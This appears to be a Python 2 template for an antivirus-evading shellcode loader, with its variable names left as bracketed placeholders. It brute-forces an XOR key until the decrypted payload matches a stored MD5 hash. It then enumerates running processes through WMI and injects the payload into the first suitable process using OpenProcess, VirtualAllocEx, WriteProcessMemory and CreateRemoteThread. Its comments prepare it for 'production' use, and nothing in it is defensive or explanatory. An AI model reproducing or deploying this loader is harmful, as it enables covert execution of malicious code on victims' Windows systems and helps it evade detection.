[exceptions] = [
    'svchost.exe',
    'taskhostw.exe',
    'taskhost.exe',
    'igfxEM.exe',
    'igfxTray.exe',
    'RuntimeBroker.exe',
    'MSASCuiL.exe',
    'Greenshot.exe',
    'ndmnt.exe',
    'dllhost.exe',
    'SettingSyncHost.exe',
    'cmd.exe',
]

def [xor]([message], [key]):
    [toret] = ''
    for [c], [k] in [itools].izip([message], [itools].cycle([key])):
        [toret] += chr(ord([c]) ^ ord([k]))
    return [toret]

[encrypted] = "[CRYPTED]"
[decrypted] = ""
[amount] = 1
[found] = False
while True:
    for [currkey] in [itools].product([stst].digits+[stst].ascii_lowercase+[stst].ascii_uppercase, repeat=[amount]):
        [decrypted] = [xor]([bed].decodestring([encrypted]), str(''.join([currkey])))
		# DEBUG Print for current MD5
        # print [HL].md5([decrypted]).hexdigest().upper()
        if [HL].md5([decrypted]).hexdigest().upper() == "[MD5SUM]":
            [found] = True
            # Remove the following print on production.
            print "Key Found! Trying to find suitable process to inject. Please wait..."
            break
    if [found] == True:
        break
    [amount] += 1

[WMI] = [GEOBJECT]('winmgmts:')
[processes] = [WMI].InstancesOf('Win32_Process')
for [procval] in [processes]:
    [process_id] = [procval].Properties_('ProcessId').Value
	
    if [procval].Properties_('Name').Value in [exceptions]:
	    continue

    [shellcode] = [decrypted]

    [process_handle] = windll.kernel32.OpenProcess(0x1F0FFF, False, [process_id])

    if not [process_handle]:
        continue

    [memory_allocation_variable] = windll.kernel32.VirtualAllocEx([process_handle], 0, len([shellcode]), 0x00001000, 0x40)
    windll.kernel32.WriteProcessMemory([process_handle], [memory_allocation_variable], [shellcode], len([shellcode]), 0)

    if not windll.kernel32.CreateRemoteThread([process_handle], None, 0, [memory_allocation_variable], 0, 0, 0):
        continue

    # Remove the following print for production.
    print "Success! PID: %s - ProcName: %s" % ([procval].Properties_('ProcessId').Value, [procval].Properties_('Name').Value)
    break
